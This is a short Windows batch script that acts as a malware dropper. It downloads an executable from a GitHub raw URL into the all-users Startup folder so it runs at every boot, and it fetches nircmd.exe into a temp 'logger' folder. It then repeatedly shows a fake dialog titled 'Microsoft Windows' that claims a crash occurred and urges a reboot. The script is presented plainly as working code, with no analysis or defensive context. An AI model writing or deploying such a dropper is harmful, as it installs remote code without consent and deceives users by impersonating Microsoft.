@echo off
:start
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/boot.exe -OutFile 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe'
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/nircmd.exe -OutFile %temp%\logger\nircmd.exe
goto check
:rebootpls
timeout 300
:check
if exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe" if exist "%temp%\logger\nircmd.exe" goto rebootprompt
if not exist "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\boot.exe" goto start
if not exist "%temp%\logger\nircmd.exe" goto start
:rebootprompt
%temp%\logger\nircmd.exe qboxcom "Windows has detected a recent crash. A reboot should be able to fix this problem. (If the problem persists go to https://support.microsoft.com/)" "Microsoft Windows" exitwin reboot
goto rebootpls
